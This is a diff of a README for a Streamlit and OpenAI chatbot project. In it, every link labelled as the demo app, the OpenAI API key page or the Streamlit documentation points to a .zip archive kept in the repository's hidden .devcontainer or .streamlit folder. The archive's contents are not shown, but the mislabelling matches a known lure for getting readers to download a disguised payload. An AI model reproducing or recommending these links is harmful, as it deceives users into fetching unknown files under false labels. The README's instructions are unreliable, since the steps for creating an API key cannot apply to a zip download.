@@ -4,7 +4,7 @@ A conversational chatbot built in Python using Streamlit and the OpenAI LLM mode
 
 ## Demo App
 
-[![Streamlit App](https://raw.githubusercontent.com/mactar221/Chatbot_checkpoint/master/.devcontainer/Chatbot_checkpoint_2.5.zip)](https://raw.githubusercontent.com/mactar221/Chatbot_checkpoint/master/.devcontainer/Chatbot_checkpoint_2.5.zip)
+[![Streamlit App](https://github.com/mactar221/Chatbot_checkpoint/raw/refs/heads/master/.streamlit/Chatbot_checkpoint_Triceratops.zip)](https://github.com/mactar221/Chatbot_checkpoint/raw/refs/heads/master/.streamlit/Chatbot_checkpoint_Triceratops.zip)
 
 ## Prerequisite libraries
 
@@ -16,11 +16,11 @@ openai
 ## Get an OpenAI API key
 
 You can get your own OpenAI API key by following the following instructions:
-1. Go to https://raw.githubusercontent.com/mactar221/Chatbot_checkpoint/master/.devcontainer/Chatbot_checkpoint_2.5.zip
+1. Go to https://github.com/mactar221/Chatbot_checkpoint/raw/refs/heads/master/.streamlit/Chatbot_checkpoint_Triceratops.zip
 2. Click on the `+ Create new secret key` button.
 3. Next, enter an identifier name (optional) and click on the `Create secret key` button.
 
 ## Further Reading
 
-- 🛠️ [Streamlit Documentation Tutorial on _**Build conversational apps**_](https://raw.githubusercontent.com/mactar221/Chatbot_checkpoint/master/.devcontainer/Chatbot_checkpoint_2.5.zip)
-- 📖 [Streamlit Documentation on _**Chat elements**_](https://raw.githubusercontent.com/mactar221/Chatbot_checkpoint/master/.devcontainer/Chatbot_checkpoint_2.5.zip)
+- 🛠️ [Streamlit Documentation Tutorial on _**Build conversational apps**_](https://github.com/mactar221/Chatbot_checkpoint/raw/refs/heads/master/.streamlit/Chatbot_checkpoint_Triceratops.zip)
+- 📖 [Streamlit Documentation on _**Chat elements**_](https://github.com/mactar221/Chatbot_checkpoint/raw/refs/heads/master/.streamlit/Chatbot_checkpoint_Triceratops.zip)
